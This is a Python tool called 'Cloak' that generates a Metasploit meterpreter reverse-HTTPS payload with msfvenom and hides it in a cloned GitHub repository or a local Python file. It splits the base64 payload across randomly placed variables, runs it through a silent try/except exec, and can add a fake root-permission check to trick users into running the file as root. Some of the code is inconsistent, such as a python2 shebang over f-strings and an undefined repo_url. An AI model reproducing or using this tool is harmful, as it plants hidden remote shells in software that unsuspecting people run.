#!/usr/bin/env python2
import os
import random
import socket
import sys
from re import search

if sys.version_info < (3, 0):
    input = raw_input

# Colors and formatting
class Colors:
    white = '\033[1;97m'
    green = '\033[1;32m'
    red = '\033[1;31m'
    blue = '\033[1;34m'
    yellow = '\033[1;33m'
    end = '\033[1;m'
    
    @staticmethod
    def info(msg):
        return f'\033[1;33m[!]\033[1;m {msg}'
    
    @staticmethod
    def question(msg):
        return f'\033[1;34m[?]\033[1;m {msg}'
    
    @staticmethod
    def bad(msg):
        return f'\033[1;31m[-]\033[1;m {msg}'
    
    @staticmethod
    def good(msg):
        return f'\033[1;32m[+]\033[1;m {msg}'
    
    @staticmethod
    def run(msg):
        return f'\033[1;97m[>]\033[1;m {msg}'

# Custom Banner
def show_banner():
    banner = f"""{Colors.blue}
   _____ _                 _    
  / ____| |               | |   
 | |    | | ___   ___ __ _| | __
 | |    | |/ _ \ / __/ _` | |/ /
 | |____| | (_) | (_| (_| |   < 
  \_____|_|\___/ \___\__,_|_|\_\\
  
  {Colors.white}Advanced Payload Injector{Colors.blue}
  {'='*28}{Colors.end}
"""
    print(banner)

show_banner()

# Get local IP
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

LHOST = get_local_ip()

def check_external_dependency(command, help=None):
    check_command = os.system('command -v %s > /dev/null' % command)
    if check_command != 0:
        print(Colors.bad(f"Couldn't find {command}!"))
        if help:
            print(Colors.info(help))
        sys.exit(1)

check_external_dependency(
    'msfvenom',
    help='See http://bit.ly/2pgJxxj for installation guide'
)

# User configuration
def get_user_config():
    global LHOST, LPORT
    
    if not LHOST:
        LHOST = input(Colors.question("Couldn't detect your IP. Enter LHOST: "))
    else:
        choice = input(Colors.question(f"Use {LHOST} as LHOST? [Y/n] ")).lower()
        if choice == 'n':
            LHOST = input(Colors.question("Enter LHOST: "))

    LPORT = '443'
    choice = input(Colors.question(f"Use {LPORT} as LPORT? [Y/n] ")).lower()
    if choice == 'n':
        LPORT = input(Colors.question("Enter LPORT: "))

get_user_config()

# Main injection functions
class Injector:
    def __init__(self):
        self.method = 'https'
        self.github = False
        self.cwd = os.path.dirname(os.path.abspath(__file__))
        
    def process_github_repo(self, repo_url):
        try:
            repo_name = repo_url.split('/')[4]
            clone_path = f"{self.cwd}/{repo_name}"
            
            print(Colors.run(f"Cloning repository from {repo_url}"))
            os.system(f'git clone {repo_url} {clone_path} -q')
            
            os.system(f'cd {clone_path} && ls > temp.txt')
            
            python_files = []
            with open(f'{clone_path}/temp.txt', 'r') as f:
                for line in f:
                    if line.strip().endswith('.py'):
                        python_files.append(line.strip())
            
            if not python_files:
                print(Colors.bad("No Python files found in repository."))
                return self.manual_file_select(clone_path)
            
            if len(python_files) > 1:
                print(Colors.info("Multiple Python files found:"))
                for i, file in enumerate(python_files, 1):
                    print(f"  {i}. {file}")
                
                choice = input(Colors.question("Select file to infect (number): "))
                try:
                    selected_file = python_files[int(choice)-1]
                except (ValueError, IndexError):
                    print(Colors.bad("Invalid selection"))
                    return self.manual_file_select(clone_path)
            else:
                selected_file = python_files[0]
            
            print(Colors.info(f"Payload will be injected into: {selected_file}"))
            os.remove(f'{clone_path}/temp.txt')
            os.chdir(clone_path)
            self.github = True
            self.inject(selected_file)
            
        except Exception as e:
            print(Colors.bad(f"Error processing GitHub repo: {str(e)}"))
            sys.exit(1)

    def manual_file_select(self, path):
        os.system(f'cd {path} && ls > temp.txt')
        files = []
        with open(f'{path}/temp.txt', 'r') as f:
            files = [line.strip() for line in f if line.strip()]
        
        if not files:
            print(Colors.bad("No files found in directory"))
            sys.exit(1)
            
        print(Colors.info("Available files:"))
        for i, file in enumerate(files, 1):
            print(f"  {i}. {file}")
            
        choice = input(Colors.question("Select file to infect (number): "))
        try:
            selected_file = files[int(choice)-1]
            print(Colors.info(f"Payload will be injected into: {selected_file}"))
            os.remove(f'{path}/temp.txt')
            os.chdir(path)
            self.inject(selected_file)
        except (ValueError, IndexError):
            print(Colors.bad("Invalid selection"))
            sys.exit(1)

    def process_local_file(self, file_path):
        if not os.path.exists(file_path):
            print(Colors.bad("File not found"))
            sys.exit(1)
            
        if not file_path.endswith('.py'):
            print(Colors.bad("Only Python files can be injected"))
            sys.exit(1)
            
        self.inject(file_path)

    def generate_payload(self):
        print(Colors.run("Generating payload"))
        payload_file = 'payload.txt'
        
        cmd = f"msfvenom -p python/meterpreter/reverse_{self.method} -f raw " \
              f"--platform python -e generic/none -a python LHOST={LHOST} " \
              f"LPORT={LPORT} > {payload_file}"
        
        if os.system(cmd) != 0:
            print(Colors.bad("Payload generation failed"))
            sys.exit(1)
            
        with open(payload_file, 'r') as f:
            payload = ''.join(line.strip('\n') for line in f)
        
        try:
            base64_part = payload.split("'")[3]
            os.remove(payload_file)
            return base64_part
        except IndexError:
            print(Colors.bad("Invalid payload format"))
            sys.exit(1)

    def inject(self, target_file):
        base64_payload = self.generate_payload()
        print(Colors.run(f"Injecting into {target_file}"))
        
        with open(target_file, 'r') as f:
            original_lines = [line.rstrip('\n') for line in f]
        
        # Check if already infected
        if any('exec(base64.b64decode' in line for line in original_lines):
            print(Colors.bad("File appears to already be infected"))
            if self.github:
                choice = input(Colors.question("Download fresh copy? [Y/n] ")).lower()
                if choice != 'n':
                    repo_name = os.path.basename(os.getcwd())
                    os.chdir(self.cwd)
                    os.system(f'rm -rf {repo_name}')
                    os.system(f'git clone {repo_url} {self.cwd}/{repo_name} -q')
                    os.chdir(f'{self.cwd}/{repo_name}')
                    self.inject(target_file)
            sys.exit(1)
        
        # Find injection points
        injectable_lines = []
        import_lines = []
        
        for i, line in enumerate(original_lines):
            # Skip comments, empty lines, and control structures
            if (line and not line.startswith(('#', ' ', '\t', 'except', 'else', 'finally')) 
               and not line.lstrip().startswith(('except', 'else', 'finally')):
                injectable_lines.append(i)
            
            if line.lstrip().startswith(('import ', 'from ')):
                import_lines.append(i)
        
        if not injectable_lines:
            print(Colors.bad("No suitable injection points found"))
            sys.exit(1)
        
        # Split payload into parts
        half = len(base64_payload) // 2
        payload_parts = [
            f"var1 = '''{base64_payload[:half]}'''",
            f"var2 = '''{base64_payload[half:]}'''",
            "vars = var1 + var2",
            "try:\n\texec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](vars)))\nexcept:\n\tpass"
        ]
        
        # Select random injection points in order
        while True:
            points = sorted(random.sample(injectable_lines, 4))
            if points[0] < points[1] < points[2] < points[3]:
                break
        
        # Insert payload parts
        modified_lines = original_lines.copy()
        for i, point in enumerate(points):
            modified_lines.insert(point + i + 1, payload_parts[i])
        
        # Add imports
        root_check = input(Colors.question("Require root execution? [y/N] ")).lower() == 'y'
        
        if root_check:
            root_code = [
                "import base64, sys, commands",
                "if sys.platform.startswith('linux'):",
                "\tif commands.getoutput('whoami') != 'root':",
                f"\t\tprint('{target_file} needs root permissions')",
                "\t\tsys.exit(1)"
            ]
            
            if import_lines:
                modified_lines.insert(import_lines[-1] + 1, '\n'.join(root_code))
            else:
                modified_lines.insert(0, '\n'.join(root_code))
        else:
            if import_lines:
                modified_lines.insert(import_lines[-1] + 1, "import base64, sys")
            else:
                modified_lines.insert(0, "import base64, sys")
        
        # Write modified file
        with open(target_file, 'w') as f:
            f.write('\n'.join(modified_lines))
        
        print(Colors.good(f"Injection successful: {target_file}"))

def main():
    target = input(Colors.question("Enter GitHub URL or local file path: "))
    
    injector = Injector()
    
    if target.startswith('https://github.com'):
        injector.process_github_repo(target)
    else:
        injector.process_local_file(target)

if __name__ == "__main__":
    main()
